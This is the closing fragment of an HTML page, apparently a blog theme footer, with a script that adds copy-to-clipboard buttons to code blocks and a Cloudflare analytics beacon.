    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "069018536ef0421ebc5bb5e449328773"}'></script>

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
